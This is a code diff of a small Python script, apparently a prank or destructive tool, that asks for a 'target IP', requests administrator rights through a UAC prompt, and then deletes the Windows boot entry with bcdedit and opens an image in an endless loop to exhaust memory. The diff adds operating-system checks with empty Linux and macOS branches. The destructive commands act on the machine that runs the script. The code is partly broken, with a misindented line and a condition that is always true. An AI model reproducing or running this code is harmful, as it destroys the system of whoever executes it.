@@ -12,13 +12,11 @@
 import time
 import os
 import ctypes, sys
-
-def is_admin(): 
+def is_usr_admin(): 
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
- 
 
 def main(rhost):
     if len(rhost) <= 15:
@@ -31,10 +29,17 @@ def main(rhost):
             time.sleep(1)
             destroy = input("Do you want to corrupt his system files? (Y or N): ")
             if destroy == 'Y' or 'y': #here is where the detruction starts
-                os.system("bcdedit.exe /delete {current}") # This destroyes the bootloader for good
-                while True:
-                    #opens a image forever until the machine runs out of ram
-                    os.startfile('troll.jpg')
+                if sys.platform.startswith("linux"):
+                    #linux destrucion code here
+                    print("os linux found")
+                if sys.platform.startswith("win32"):
+                    #windows destrucion starts here
+                    os.system("bcdedit.exe /delete {current}") # This destroyes the bootloader for good
+                    while True:
+                        #opens a image forever until the machine runs out of ram
+                        os.startfile('troll.jpg')
+                 if sys.platform.startswith("darwin"):
+                    pass
         else:
             print("Quitting ")
             quit
@@ -42,10 +47,15 @@ def main(rhost):
         print("Invalid Ip")
         quit
 
+
 # main guard #
 if __name__ == '__main__':
-    if is_admin():
-        main(input("SET TARGET IP: "))
+    if sys.platform.startswith("win32"):
+        if is_usr_admin():
+            main(input("SET TARGET IP: "))
+        else:
+            # asks for elevated perms
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
     else:
-        # asks for elevated perms
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        #this pervents the first if statment to trigger in a linux or mac enviroment
+        main(input("SET TARGET IP: "))
